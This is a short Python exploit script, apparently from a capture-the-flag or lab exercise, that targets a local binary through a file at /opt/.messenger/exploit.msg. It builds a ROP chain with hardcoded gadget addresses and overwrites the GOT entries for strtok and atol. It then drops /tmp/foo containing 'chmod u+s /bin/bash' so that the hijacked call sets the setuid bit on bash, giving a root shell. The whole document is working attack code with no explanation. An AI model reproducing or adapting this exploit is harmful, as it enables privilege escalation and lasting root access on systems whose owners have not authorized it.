#!/usr/bin/python3
import struct, os

def p32(addr):
    return struct.pack("I", addr)

def add(addr):
    result  = b""
    result += p32(0x0804859d)
    result += p32(addr - 0x1270304)
    result += p32(0x08048feb)
    return result

offset = 212

pop4_ret = 0x08048ddc

eax_0 = 0x8048790
call_eax = 0x8048786

got_strtok = 0x804b05c
got_atol = 0x804b04c
foo_str = 0x8048eef

e800 = 0x80480c7
e100 = 0x8048013

rop  = b""
rop += p32(eax_0)
rop += add(got_atol)
rop += add(e800) + add(e100)
rop += p32(call_eax)
rop += p32(foo_str)

shellcode  = b""
shellcode += rop
shellcode += b"A" * (offset - len(shellcode))
shellcode += p32(got_strtok)

payload  = b""
payload += b"A" * 4
payload += b"|"
payload += shellcode
payload += b"\n"

payload += p32(pop4_ret)
payload += b"|"
payload += b"A" * 4
payload += b"\n"

with open("/opt/.messenger/exploit.msg", "wb") as file:
    file.write(payload)

command = b"chmod u+s /bin/bash"

with open("/tmp/foo", "wb") as file:
    file.write(command)

os.system("chmod +x /tmp/foo")
